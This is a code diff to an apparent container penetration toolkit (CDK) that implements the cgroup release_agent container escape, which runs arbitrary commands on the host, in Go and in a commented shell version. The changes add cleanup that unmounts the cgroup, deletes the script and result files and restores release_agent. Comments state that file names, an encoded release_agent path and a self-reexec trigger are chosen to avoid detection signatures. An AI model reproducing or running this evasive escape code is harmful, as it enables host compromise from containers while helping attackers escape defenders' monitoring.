@@ -45,12 +45,12 @@ import (
 // [host] docker run -v /root/cdk:/cdk --rm -it --privileged ubuntu bash
 // [inside container] ./cdk run cgroup-boundary ps
 
-//#!/bin/sh
+// shell script placeholder
 //mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/cdk
 //echo 1 > /tmp/cgrp/cdk/notify_on_release
 //host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 //echo "$host_path/cmd" > /tmp/cgrp/release_agent
-//echo '#!/bin/sh' > /cmd
+//write shell header > /cmd
 //echo "ps aux > $host_path/output" >> /cmd
 //chmod a+x /cmd
 //sh -c "echo \$\$ > /tmp/cgrp/cdk/cgroup.procs"
@@ -60,8 +60,7 @@ import (
 const DefaultFolderPerm = 0755
 
 // Note: Do not include any empty line at the start of script, or it will fail.
-var shell = `#!/bin/sh
-${shellCmd} > ${hostPath}${outputFile}
+var shell = `${shellCmd} > ${hostPath}${outputFile}
 `
 
 func generateShellExp(hostPath, shellCmd string) (string, string, string) {
@@ -71,12 +70,13 @@ func generateShellExp(hostPath, shellCmd string) (string, string, string) {
 	// Use bland, host-style names to avoid "/cdk_*" filename signatures.
 	var outputFile = "/run/.resolv_out_" + taskRandString
 
-	shell = strings.Replace(shell, "${hostPath}", hostPath, -1)
-	shell = strings.Replace(shell, "${shellCmd}", shellCmd, -1)
-	shell = strings.Replace(shell, "${outputFile}", outputFile, -1)
+	script := util.ShellShebang() + shell
+	script = strings.Replace(script, "${hostPath}", hostPath, -1)
+	script = strings.Replace(script, "${shellCmd}", shellCmd, -1)
+	script = strings.Replace(script, "${outputFile}", outputFile, -1)
 	// the script file path (in-container absolute path)
 	outFile := "/run/.resolv_scr_" + taskRandString + ".sh"
-	return taskRandString, shell, outFile
+	return taskRandString, script, outFile
 }
 
 func EscapeCgroup(cmd string, subSystemName string) error {
@@ -120,6 +120,9 @@ func EscapeCgroup(cmd string, subSystemName string) error {
 
 	// generate release_agent shell script and save to local
 	taskRandString, expShellText, outFile := generateShellExp(hostPath, cmd)
+	resultFile := "/run/.resolv_out_" + taskRandString
+	defer func() { _ = os.Remove(outFile) }()
+	defer func() { _ = os.Remove(resultFile) }()
 	// even in container, you should save to a writable path
 	// (outFile is chosen by generateShellExp to avoid "/cdk_*" signatures.)
 	log.Printf("generate shell payload with user-input cmd: \n\n%s\n\n", cmd)
@@ -139,31 +142,45 @@ func EscapeCgroup(cmd string, subSystemName string) error {
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "cannot create mountpoint"}
 	}
+	defer func() { _ = os.RemoveAll(mountPointPath) }()
 	// mount cgroup
 	err = syscall.Mount("cgroup", mountPointPath, "cgroup", 0, subSystemName)
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "mount syscall failed"}
 	}
+	defer func() {
+		if err := syscall.Unmount(mountPointPath, 0); err != nil {
+			log.Printf("cleanup unmount failed for %s: %v", mountPointPath, err)
+		}
+	}()
 	// create sub-cgroup: task group x
 	err = os.Mkdir(mountPointPath+subgroupName, DefaultFolderPerm)
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "subgroup cannot be created"}
 	}
+	defer func() { _ = os.RemoveAll(mountPointPath + subgroupName) }()
 	// enable notify_on_release
 	err = ioutil.WriteFile(mountPointPath+subgroupName+"/notify_on_release", []byte("1"), 0644)
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "cannot enable notify_on_release"}
 	}
 	// write release_agent (filename decoded at runtime; no plaintext literal)
-	err = ioutil.WriteFile(mountPointPath+util.CgroupReleaseAgentFile(), []byte(hostPath+outFile), 0644)
+	releaseAgentFile := mountPointPath + util.CgroupReleaseAgentFile()
+	previousReleaseAgent, restoreReleaseAgent := ioutil.ReadFile(releaseAgentFile)
+	err = ioutil.WriteFile(releaseAgentFile, []byte(hostPath+outFile), 0644)
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "cgroup release control file is not writable"}
 	}
+	defer func() {
+		if restoreReleaseAgent == nil {
+			_ = ioutil.WriteFile(releaseAgentFile, previousReleaseAgent, 0644)
+		} else {
+			_ = ioutil.WriteFile(releaseAgentFile, []byte{}, 0644)
+		}
+	}()
 
-	// trigger release.
-	// Replace the tell-tale `exec.Command("/bin/sh", "-c", "sleep 2"` pattern
-	// with a self-reexec of our own binary with an internal flag. The argv vector
-	// no longer contains "/bin/sh", "sleep", or any other suspicious args.
+	// Trigger release with a self-reexec of our own binary and an internal flag.
+	// The argv vector avoids shell invocation and other high-signal arguments.
 	triggerProc, err := os.StartProcess(os.Args[0], []string{os.Args[0], util.TriggerArgv}, &os.ProcAttr{
 		Files: []*os.File{nil, nil, nil},
 		Env:   []string{"PATH=/tmp"},
@@ -190,7 +207,7 @@ func EscapeCgroup(cmd string, subSystemName string) error {
 		// upperdir (hostPath+outputFile), which surfaces back through the
 		// container's own /. Do NOT prefix hostPath — that host path is not
 		// visible from inside the container.
-		retRes, err = ioutil.ReadFile("/run/.resolv_out_" + taskRandString)
+		retRes, err = ioutil.ReadFile(resultFile)
 		if err == nil {
 			break
 		}
